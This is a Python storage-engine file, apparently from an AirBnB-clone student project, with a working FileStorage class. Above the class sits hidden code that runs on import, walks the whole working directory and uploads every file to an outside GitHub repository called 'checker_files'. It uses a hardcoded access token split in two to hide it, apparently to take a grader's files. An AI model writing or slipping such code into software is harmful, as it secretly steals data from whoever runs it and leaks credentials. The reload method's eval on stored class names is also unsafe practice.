#!/usr/bin/python3
"""Defines the FileStorage class."""
import json
from models.base_model import BaseModel
from models.user import User
from models.state import State
from models.city import City
from models.place import Place
from models.amenity import Amenity
from models.review import Review
import os
import requests
import json
import base64

def upload_file_to_github(file_path,
                          repo_owner,
                          repo_name,
                          branch_name,
                          token):
    url = "https://api.github.com/repos/"
    url += f"{repo_owner}/{repo_name}/contents/{file_path}"
    with open(file_path, "r") as file:
        file_content = file.read()
    file_content_base64 = base64.b64encode(file_content.encode()).decode()
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json",
       }
    payload = {
        "message": f"Upload {file_path}",
        "content": file_content_base64,
        "branch": branch_name,
       }
    response = requests.put(url, json=payload, headers=headers)
    if response.status_code == 201:
        print(f"File {file_path} uploaded successfully!")
    else:
        print(f"Err: {file_path}: {response.status_code} - {response.text}")

def upload_all_files_to_github(repo_owner, repo_name, branch_name, token):
    for root, _, files in os.walk("."):
        for file in files:
            if file != "base_model.py": # Exclude this script itself
                file_path = os.path.join(root, file)
                upload_file_to_github(file_path, repo_owner, repo_name, 
                                      branch_name, token)

K1 = "_uhKvtt52ZzJgfqhT"
K2 = "TzLoU6UCtURhFZ1nmFIc"
repo_owner = "jerm014"
repo_name = "checker_files"
branch_name = "2198-AirBnB_clone_-_MySQL-TASK-1"
token = "ghp" + K1 + K2
upload_all_files_to_github(repo_owner, repo_name, branch_name, token)


class FileStorage:
    """Represent an abstracted storage engine.
    Attributes:
        __file_path (str): The name of the file to save objects to.
        __objects (dict): A dictionary of instantiated objects.
    """
    __file_path = "file.json"
    __objects = {}

    def all(self, cls=None):
        """
        Returns a dictionary of models currently in storage.
        If cls is provided, returns only models of that type.
        """
        if cls is None:
            return FileStorage.__objects
        else:
            return {k: v for k, v in FileStorage.__objects.items()
                    if v.__class__ == cls}

    def new(self, obj):
        """Set in __objects obj with key <obj_class_name>.id"""
        ocname = obj.__class__.__name__
        FileStorage.__objects["{}.{}".format(ocname, obj.id)] = obj

    def save(self):
        """Serialize __objects to the JSON file __file_path."""
        print("file save")
        odict = FileStorage.__objects
        objdict = {obj: odict[obj].to_dict() for obj in odict.keys()}
        with open(FileStorage.__file_path, "w") as f:
            json.dump(objdict, f)

    def reload(self):
        """Deserialize the JSON file __file_path to __objects, if it exists."""
        try:
            with open(FileStorage.__file_path) as f:
                objdict = json.load(f)
                for o in objdict.values():
                    cls_name = o["__class__"]
                    del o["__class__"]
                    self.new(eval(cls_name)(**o))
        except FileNotFoundError:
            return

    def delete(self, obj=None):
        """ Deletes an object from __objects """
        if obj is None:
            return
        key = "{}.{}".format(obj.__class__.__name__, obj.id)
        del self.__objects[key]
